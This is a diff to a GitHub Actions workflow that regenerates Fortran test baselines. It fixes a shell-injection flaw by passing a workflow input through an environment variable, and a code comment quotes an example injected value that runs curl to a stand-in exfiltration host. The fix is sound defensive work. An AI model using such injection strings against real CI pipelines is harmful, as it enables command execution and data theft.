@@ -35,6 +35,16 @@ jobs:
     # gfortran 13.2.0 (which is what python-tests.yml's `ubuntu-latest`
     # currently resolves to; the regen workflow pins explicitly because
     # baseline reproducibility cannot tolerate the silent image rotation).
+    #
+    # KNOWN DIVERGENCE RISK (Bugbot LOW, 2026-05-13): when GitHub rotates
+    # `ubuntu-latest` to a newer image, python-tests.yml will silently move
+    # to a newer gfortran while this workflow stays on 13.2. CI will then
+    # fail at 1e-10 against baselines this workflow produced — the same
+    # class of failure #197 itself tracks. Mitigation when that happens:
+    # pin python-tests.yml to `ubuntu-24.04` too (small separate PR), then
+    # re-trigger this workflow to regenerate baselines once. The new pin
+    # should match what python-tests.yml uses.
+    #
     # Re-pin to the next LTS
     # when GitHub deprecates this image and regenerate baselines once.
     runs-on: ubuntu-24.04
@@ -136,10 +146,19 @@ jobs:
 
       - name: Regenerate metrics.json per fixture
         shell: bash
+        # Pass workflow input through env to avoid shell-injection at the
+        # `${{ ... }}` interpolation site (Bugbot MEDIUM, 2026-05-13).
+        # Without this, a write-access user could inject arbitrary commands
+        # via the `fixtures` input (e.g. `eq_tst2"; curl evil.example/exfil`).
+        # With env-passthrough, bash reads the value as a normal var; the
+        # case-statement at the dispatch step further restricts to
+        # tr_*/eq_*/tot_* prefixes, exit-on-mismatch.
+        env:
+          FIXTURES: ${{ inputs.fixtures }}
         run: |
           set -eo pipefail
           mkdir -p regen-output
-          for fixture in ${{ inputs.fixtures }}; do
+          for fixture in $FIXTURES; do
             echo "::group::regen $fixture"
             mkdir -p "regen-output/$fixture"
 
